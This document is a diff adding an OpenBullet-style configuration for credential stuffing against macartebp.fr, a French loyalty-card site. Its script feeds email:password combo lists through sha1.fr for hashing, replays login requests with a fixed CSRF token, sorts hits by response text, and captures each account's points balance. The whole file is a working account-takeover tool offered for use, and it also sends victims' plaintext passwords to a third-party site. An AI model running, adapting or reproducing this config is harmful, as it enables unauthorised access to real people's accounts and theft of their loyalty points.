@@ -1,0 +1,48 @@
+[SETTINGS]
+{
+  "Name": "Macartebp.fr ( Capture )",
+  "SuggestedBots": 10,
+  "LastModified": "2018-07-02T04:59:54.6421453+00:00",
+  "AdditionalInfo": "",
+  "Author": "Marine",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#GET_TOKEN REQUEST POST "https://www.sha1.fr/" AutoRedirect=TRUE 
+  CONTENT "text=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "referer: https://www.sha1.fr/" 
+  HEADER "origin: https://www.sha1.fr" 
+PARSE "<SOURCE>" LR "<textarea class=\"form-control\">" "</textarea>" Recursive=FALSE -> VAR "PASSHASH" "" "" 
+#LOGIN REQUEST POST "https://www.macartebp.fr/welcome.do" AutoRedirect=TRUE 
+  CONTENT "method%3ALogin=&loginData.login=<USER>&loginData.password=<PASSHASH>&OWASP-CSRFTOKEN=BBSE-GYL2-N8BA-EL39-FZEB-62K0-FESA-G18Y" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "referer: https://www.macartebp.fr/welcome.do" 
+  HEADER "origin: https://www.macartebp.fr" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "Identifiant ou mot de passe incorrect" 
+  KEYCHAIN Success OR 
+    KEY "onclick=\"CLMUtils.logoutFromWebshop();\">déconnexion</a></li>" 
+#CAPTURE_POINTS PARSE "<SOURCE>" LR "<a href=\"account.do\" class=\"point\">" "</a>" Recursive=FALSE -> CAP "Points" "" "" 
